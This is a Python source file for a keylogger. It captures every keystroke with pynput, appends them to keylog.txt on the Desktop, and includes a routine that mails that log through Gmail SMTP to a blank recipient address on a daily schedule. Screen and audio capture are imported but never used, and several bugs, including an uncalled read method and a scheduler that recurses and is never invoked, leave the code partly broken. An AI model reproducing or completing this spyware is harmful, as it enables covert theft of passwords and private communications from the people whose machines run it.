import datetime as dt
import getpass
import platform
import smtplib
import socket
import time
from email import encoders
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from multiprocessing import Process, freeze_support
from os.path import basename

from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write

keys_info = "keylog.txt"
file_path = "C:\\Users\\modiv\\Desktop"
extend="\\"
email_addr = ""
password = ""

toaddr = ""

def send_email():

    server = smtplib.SMTP ('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_addr, password)

    message = MIMEMultipart()
    attach_file_name = keys_info
    attach_file = open(attach_file_name, 'rb') 
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read)
    encoders.encode_base64(payload)
    message.attach(payload)
    server.sendmail(email_addr, toaddr, message)
    server.quit()

first_email_time = dt.datetime(2021,6,20,7,15,0) # set your sending time in UTC
interval = dt.timedelta(minutes=1440) # set the interval for sending the email

send_time = first_email_time

def send_email_at(send_time):
    time.sleep(send_time.timestamp() - time.time())
    send_email()
    print('email sent')
    while True:
        send_email_at(send_time)
        send_time = send_time + interval

count = 0
keys = []


def on_press(key): 
    global keys, count

    print(key)
    keys.append(key) 
    count +=1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    

